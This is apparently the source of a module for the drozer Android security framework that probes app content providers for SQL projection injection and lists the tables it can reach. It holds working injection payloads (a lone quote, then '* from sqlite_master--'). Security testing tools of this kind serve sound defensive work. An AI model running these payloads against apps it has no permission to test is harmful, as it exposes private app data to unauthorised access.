from pydiesel.reflection import ReflectionException

from drozer.modules import common, Module

class SqlTables(Module, common.FileSystem, common.PackageManager, common.Provider, common.Strings, common.ZipFile):

    name = "Find tables accessible through SQL injection vulnerabilities."
    description = "Enumerate SQL tables accessible through SQL (projection) Injection vulnerabilities."
    examples = ""
    author = "Rijnard"
    date = "2013-01-23"
    license = "BSD (3 clause)"
    path = ["scanner", "provider"]
    permissions = ["com.mwr.dz.permissions.GET_CONTEXT"]

    def add_arguments(self, parser):
        parser.add_argument("-a", "--package", "--uri", dest="package_or_uri", help="specify a package, or content uri to search", metavar="<package or uri>")
        
    def execute(self, arguments):
        results = []
        if arguments.package_or_uri != None and arguments.package_or_uri.startswith("content://"):
            results.append(self.__test_uri(arguments.package_or_uri))
        else:
            for uri in self.findAllContentUris(arguments.package_or_uri):
                results.append(self.__test_uri(uri))
        
        if results: 
            self.stdout.write('\n'.join([_f for _f in results if _f]) + '\n')
        else:
            self.stdout.write("No results found.\n")

    def __test_uri(self, uri):
        try:
            self.contentResolver().query(uri, projection=["'"])
        except ReflectionException as e:
            if e.message.find("unrecognized token") >= 0: # if there's a projection injection
                try:
                    cursor = self.contentResolver().query(uri, projection=["* from sqlite_master--"])
                    resultSet = self.getResultSet(cursor)
                    listOfTables = [x for x in resultSet[1:] if str(x[0]) == "table"] # exclude indexes
                    return "Accessible tables for uri " + uri + ":\n  " + \
                                   "\n  ".join(str(x[1]) for x in listOfTables) + "\n"
                except:
                    pass
